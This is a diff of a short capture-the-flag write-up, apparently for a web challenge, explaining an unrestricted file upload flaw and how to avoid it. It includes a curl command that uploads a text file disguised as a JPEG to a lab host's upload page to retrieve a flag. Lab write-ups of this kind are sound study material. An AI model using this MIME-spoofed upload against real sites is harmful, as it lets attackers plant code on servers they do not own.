@@ -1,4 +1,8 @@
-1) blablabla
-2)
-3)
-4) curl --form "Upload=send" --header "Content-Type: multipart/form-data" --form "uploaded=@inject.txt;type=image/jpeg" 172.16.129.138/?page=upload | grep flag
+1) It is possible to upload different types of files and not just images.
+2) We could upload code directly in the website.
+3) curl --form "Upload=send" --header "Content-Type: multipart/form-data" --form "uploaded=@inject.txt;type=image/jpeg" 172.16.129.138/?page=upload | grep flag
+
+---
+How to avoid ?
+Only allow images to enter the folder where they are stored, if the file being inserted is not an image, simply reject the request.
+
